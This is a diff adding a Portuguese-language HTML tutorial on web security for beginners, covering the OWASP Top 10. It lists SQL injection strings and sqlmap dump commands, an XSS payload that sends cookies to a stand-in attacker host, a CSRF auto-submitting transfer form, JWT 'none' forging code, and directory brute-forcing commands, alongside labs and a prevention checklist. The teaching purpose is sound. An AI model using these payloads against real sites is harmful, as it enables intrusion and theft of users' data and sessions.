@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Segurança Web | Não Desista Dev</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <style>
+    .doc-container {
+      background: var(--bg-secondary);
+      border: 2px solid var(--text-primary);
+      border-radius: 10px;
+      padding: 2rem;
+      margin: 2rem 0;
+    }
+
+    .doc-header {
+      border-bottom: 1px solid var(--text-secondary);
+      padding-bottom: 1rem;
+      margin-bottom: 2rem;
+    }
+
+    .doc-title {
+      font-size: 2rem;
+      color: var(--text-primary);
+    }
+
+    .back-button {
+      display: inline-block;
+      margin-bottom: 2rem;
+      color: var(--text-primary);
+      text-decoration: none;
+      border: 1px solid var(--text-primary);
+      padding: 0.5rem 1rem;
+      border-radius: 5px;
+    }
+
+    .back-button:hover {
+      background: var(--text-primary);
+      color: var(--bg-primary);
+    }
+
+    .section {
+      margin: 2rem 0;
+    }
+
+    .section h2 {
+      color: #0f0;
+      border-left: 4px solid #0f0;
+      padding-left: 1rem;
+      margin-bottom: 1rem;
+    }
+
+    .section h3 {
+      color: #ffaa00;
+      margin: 1rem 0;
+    }
+
+    .code-block {
+      background: #000;
+      color: #0f0;
+      padding: 1rem;
+      border-radius: 5px;
+      font-family: monospace;
+      margin: 0.5rem 0;
+      border: 1px solid #333;
+      overflow-x: auto;
+    }
+
+    .tip-box {
+      background: #112233;
+      border-left: 4px solid #66c0f0;
+      padding: 1rem;
+      margin: 1rem 0;
+      border-radius: 0 5px 5px 0;
+    }
+
+    .warning-box {
+      background: #331100;
+      border-left: 4px solid #ffaa00;
+      padding: 1rem;
+      margin: 1rem 0;
+      border-radius: 0 5px 5px 0;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+      margin: 2rem 0;
+    }
+
+    .nav-link {
+      background: transparent;
+      border: 1px solid #0f0;
+      color: #0f0;
+      padding: 0.75rem 1.5rem;
+      text-decoration: none;
+      border-radius: 5px;
+      transition: all 0.3s;
+    }
+
+    .nav-link:hover {
+      background: #0f0;
+      color: #000;
+    }
+
+    .vuln-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1rem 0;
+    }
+
+    .vuln-table td {
+      padding: 0.75rem;
+      border-bottom: 1px solid #333;
+    }
+
+    .vuln-table td:first-child {
+      color: #0f0;
+      font-weight: bold;
+    }
+
+    .vuln-table tr:hover {
+      background: #1a1d24;
+    }
+  </style>
+</head>
+
+<body>
+  <canvas class="matrix-bg" id="matrix"></canvas>
+  <header class="terminal-header">
+    <div class="terminal-title"><i class="fas fa-terminal"></i> docs / tutoriais / web-security</div>
+    <div class="terminal-status">
+      <div class="status-item"><i class="fas fa-circle blink" style="color: #00ff00;"></i> TUTORIAL</div>
+    </div>
+  </header>
+
+  <main class="container">
+    <div class="nav-links">
+      <a href="../../index.html" class="nav-link"><i class="fas fa-home"></i> INÍCIO</a>
+      <a href="../guias/guia-rapido-iniciante.html" class="nav-link"><i class="fas fa-rocket"></i> GUIA RÁPIDO</a>
+      <a href="../referencias/ferramentas-completas.html" class="nav-link"><i class="fas fa-tools"></i> FERRAMENTAS</a>
+      <a href="esteganografia.html" class="nav-link"><i class="fas fa-image"></i> ESTEGANO</a>
+      <a href="forense.html" class="nav-link"><i class="fas fa-microscope"></i> FORENSE</a>
+      <a href="criptografia.html" class="nav-link"><i class="fas fa-lock"></i> CRIPTO</a>
+      <a href="redes.html" class="nav-link"><i class="fas fa-network-wired"></i> REDES</a>
+    </div>
+
+    <div class="doc-container">
+      <div class="doc-header">
+        <h1 class="doc-title">> 🌍 TUTORIAL DE SEGURANÇA WEB</h1>
+        <p>Principais vulnerabilidades e técnicas de exploração</p>
+      </div>
+
+      <div class="warning-box">
+        <strong>⚠️ AVISO LEGAL:</strong> Estas técnicas devem ser usadas apenas em ambientes controlados, laboratórios
+        próprios ou com autorização explícita. Nunca teste em sites de terceiros sem permissão.
+      </div>
+
+      <div class="section">
+        <h2>OWASP Top 10</h2>
+        <p>As 10 principais vulnerabilidades web segundo o OWASP (Open Web Application Security Project):</p>
+        <table class="vuln-table">
+          <tr>
+            <td>1. Injection</td>
+            <td>SQL, NoSQL, OS injection</td>
+          </tr>
+          <tr>
+            <td>2. Broken Authentication</td>
+            <td>Falhas em autenticação e sessão</td>
+          </tr>
+          <tr>
+            <td>3. Sensitive Data Exposure</td>
+            <td>Exposição de dados sensíveis</td>
+          </tr>
+          <tr>
+            <td>4. XML External Entities (XXE)</td>
+            <td>Ataques envolvendo XML</td>
+          </tr>
+          <tr>
+            <td>5. Broken Access Control</td>
+            <td>Falhas no controle de acesso</td>
+          </tr>
+          <tr>
+            <td>6. Security Misconfiguration</td>
+            <td>Configurações inseguras</td>
+          </tr>
+          <tr>
+            <td>7. Cross-Site Scripting (XSS)</td>
+            <td>Injeção de scripts</td>
+          </tr>
+          <tr>
+            <td>8. Insecure Deserialization</td>
+            <td>Desserialização insegura</td>
+          </tr>
+          <tr>
+            <td>9. Known Vulnerabilities</td>
+            <td>Uso de componentes vulneráveis</td>
+          </tr>
+          <tr>
+            <td>10. Insufficient Logging</td>
+            <td>Logging e monitoramento insuficientes</td>
+          </tr>
+        </table>
+      </div>
+
+      <div class="section">
+        <h2>🔍 SQL Injection (SQLi)</h2>
+        <p>Injeção de comandos SQL em entradas de usuário.</p>
+
+        <h3>Exemplos de Payloads:</h3>
+        <div class="code-block">
+          -- Login bypass
+          ' OR '1'='1' --
+
+          -- Extrair dados
+          ' UNION SELECT username, password FROM users --
+
+          -- Comentar o resto da query
+          admin' --
+        </div>
+
+        <h3>Ferramenta: SQLMap</h3>
+        <div class="code-block">
+          # Identificar bancos de dados
+          sqlmap -u "http://site.com/page?id=1" --dbs
+
+          # Listar tabelas
+          sqlmap -u "http://site.com/page?id=1" -D database --tables
+
+          # Extrair dados
+          sqlmap -u "http://site.com/page?id=1" -D database -T users --dump
+        </div>
+      </div>
+
+      <div class="section">
+        <h2>🔍 Cross-Site Scripting (XSS)</h2>
+        <p>Injeção de scripts maliciosos no lado do cliente.</p>
+
+        <h3>Tipos de XSS:</h3>
+        <ul style="color: #ccc; margin-left: 2rem;">
+          <li><strong>Refletido:</strong> Injetado na URL, executado imediatamente</li>
+          <li><strong>Armazenado:</strong> Persistente no banco de dados</li>
+          <li><strong>DOM-based:</strong> No lado do cliente (JavaScript)</li>
+        </ul>
+
+        <h3>Payloads Comuns:</h3>
+        <div class="code-block">
+          &lt;!-- Alerta básico --&gt;
+          &lt;script&gt;alert('XSS')&lt;/script&gt;
+
+          &lt;!-- Roubar cookie --&gt;
+          &lt;script&gt;fetch('http://atacante.com?cookie='+document.cookie)&lt;/script&gt;
+
+          &lt;!-- Imagem com erro --&gt;
+          &lt;img src=x onerror=alert('XSS')&gt;
+
+          &lt;!-- Iframe --&gt;
+          &lt;iframe src="javascript:alert('XSS')"&gt;
+        </div>
+      </div>
+
+      <div class="section">
+        <h2>🔍 Cross-Site Request Forgery (CSRF)</h2>
+        <p>Forjar requisições em nome de usuários autenticados.</p>
+
+        <h3>Exemplo de Payload:</h3>
+        <div class="code-block">
+          &lt;!-- Formulário malicioso --&gt;
+          &lt;form action="http://site.com/transferir" method="POST" id="csrf"&gt;
+          &lt;input type="hidden" name="conta" value="123456"&gt;
+          &lt;input type="hidden" name="valor" value="1000"&gt;
+          &lt;/form&gt;
+          &lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
+        </div>
+
+        <h3>Prevenção:</h3>
+        <div class="code-block">
+          # Token CSRF
+          &lt;input type="hidden" name="csrf_token" value="token_único"&gt;
+
+          # SameSite cookies
+          Set-Cookie: session=123; SameSite=Strict
+        </div>
+      </div>
+
+      <div class="section">
+        <h2>🔍 JWT (JSON Web Tokens)</h2>
+        <p>Tokens de autenticação que podem ser vulneráveis.</p>
+
+        <h3>Estrutura do JWT:</h3>
+        <div class="code-block">
+          header.payload.signature
+
+          # Exemplo:
+          eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ...
+        </div>
+
+        <h3>Ataque de algoritmo "none":</h3>
+        <div class="code-block">
+          import jwt
+
+          # Token com algoritmo none (não assinado)
+          token_none = jwt.encode({"user": "admin"}, algorithm="none")
+
+          # Decodificar sem verificar
+          decoded = jwt.decode(token, options={"verify_signature": False})
+        </div>
+      </div>
+
+      <div class="section">
+        <h2>🔍 IDOR (Insecure Direct Object References)</h2>
+        <p>Acessar objetos diretamente sem autorização.</p>
+
+        <h3>Exemplo:</h3>
+        <div class="code-block">
+          GET /api/user/1 # Próprio usuário
+          GET /api/user/2 # Usuário de outro (se funcionar, é IDOR)
+          GET /api/user/3 # Testar IDs sequenciais
+        </div>
+      </div>
+
+      <div class="section">
+        <h2>🛠️ Ferramentas para Web Hacking</h2>
+
+        <h3>Burp Suite</h3>
+        <div class="code-block">
+          # Funcionalidades:
+          - Proxy para interceptar requisições
+          - Repeater para repetir e modificar requests
+          - Intruder para força bruta
+          - Scanner automático de vulnerabilidades
+        </div>
+
+        <h3>OWASP ZAP</h3>
+        <div class="code-block">
+          # Alternativa gratuita ao Burp
+          - Proxy
+          - Scanner
+          - Fuzzer
+          - Spider
+        </div>
+
+        <h3>Dirb / GoBuster</h3>
+        <div class="code-block">
+          # Descobrir diretórios e arquivos
+          dirb http://site.com /usr/share/wordlists/dirb/common.txt
+          gobuster dir -u http://site.com -w wordlist.txt
+        </div>
+      </div>
+
+      <div class="section">
+        <h2>🧪 Laboratórios para Prática</h2>
+
+        <div class="code-block">
+          # DVWA (Damn Vulnerable Web Application)
+          docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+          # WebGoat
+          docker run --rm -it -p 8080:8080 webgoat/goatandwolf
+
+          # bwapp
+          docker run --rm -it -p 80:80 raesene/bwapp
+        </div>
+      </div>
+
+      <div class="section">
+        <h2>📋 Checklist de Segurança</h2>
+        <div style="background: #111; padding: 1rem; border-radius: 5px;">
+          <p><input type="checkbox"> Validar todas as entradas de usuário</p>
+          <p><input type="checkbox"> Escapar saídas (XSS prevention)</p>
+          <p><input type="checkbox"> Usar prepared statements (SQLi prevention)</p>
+          <p><input type="checkbox"> Implementar CSRF tokens</p>
+          <p><input type="checkbox"> Configurar CORS corretamente</p>
+          <p><input type="checkbox"> Usar HTTPS</p>
+          <p><input type="checkbox"> Cookies seguros (HttpOnly, Secure, SameSite)</p>
+          <p><input type="checkbox"> Rate limiting</p>
+          <p><input type="checkbox"> Logging adequado</p>
+          <p><input type="checkbox"> Headers de segurança (CSP, HSTS, X-Frame-Options)</p>
+        </div>
+      </div>
+
+      <div class="tip-box">
+        <strong>📚 Recomendação:</strong> Pratique no <a href="https://portswigger.net/web-security" target="_blank"
+          style="color: #66c0f0;">PortSwigger Web Security Academy</a> - tem laboratórios gratuitos excelentes!
+      </div>
+
+      <div class="nav-links" style="justify-content: center;">
+        <a href="../../index.html" class="nav-link">🏠 VOLTAR AO INÍCIO</a>
+        <a href="../referencias/ferramentas-completas.html" class="nav-link">🔧 FERRAMENTAS</a>
+        <a href="../guias/guia-rapido-iniciante.html" class="nav-link">📚 GUIA RÁPIDO</a>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <p>NÃO DESISTA DEV - Tutorial de Segurança Web</p>
+    <p class="copyright">Apenas para fins educacionais</p>
+  </footer>
+  <script src="../../assets/js/script.js"></script>
+</body>
+
+</html>
